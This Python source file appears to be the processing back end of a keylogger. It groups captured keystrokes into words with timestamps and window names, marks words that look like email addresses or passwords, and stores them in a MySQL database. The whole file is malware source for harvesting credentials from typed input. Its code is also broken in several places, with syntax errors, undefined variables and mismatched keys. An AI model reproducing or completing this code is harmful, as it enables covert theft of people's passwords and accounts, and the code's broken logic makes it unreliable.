from load_config import load_cfg

class Process:
    def __init__(self):
        self.words = ""
        self.payload = {
            "datetime": ""
            "epoch": ""
            "windowName": ""
            "processedWord":"",
            "isEmail": 0,
            "isPassword": 0
        }
    
    
    def separateBreakChar(self,data):
    #loop through items in log and append characters on key-down
        if (data['processedKey']):
            if (len(self.words) == 0):
                self.payload['datetime'] = data['datetime']
                self.payload['epoch'] = data['epoch']
                self.payload['windowName'] = data['windowName']
            self.words += data['processedKey']
        else:
            currWord['processedWord'] = self.words
            print("words: "+ self.words)
            self.checkEmailPassword(currWord)
            self.pushDB(currWord)
            self.words = ""
        return 0
                
    def checkEmailPassword(self,payload):
    #check the processedWord of the payload to determine if possible email or password
        word = payload['processedWord']
        if "@" in word:
            payload.isEmail = 1
        
        elif (not word.isalpha() and not word.isdigit()):
            #a high level filtering for words which are a mix of alphabet and digits, suggesting they are possible passwords
            payload.isPassword = 1
            
    
    def pushDB(self,payload):
    #push to table words
        main_cfg = load_cfg('./main_cfg.json')
        
        db = mysql.connector.connect (
            host=main_cfg['dbHost'],
            port=main_cfg['port'],
            user=main_cfg['sqlUser'],
            password=main_cfg['sqlPass'],
            database=main_cfg['db']
        )
        
        sql = f"INSERT INTO {main_cfg['dbWordTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s)"
        val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['windowName']}", f"{payload['processedKey']}",f"{payload['isEmail']}", f"{payload['isPassword']}")
        
        print(sql,val)
        
        mycursor.execute(sql, val)
        db.commit()
        
        mycursor.close()
        db.close()
        
        return 0 
    
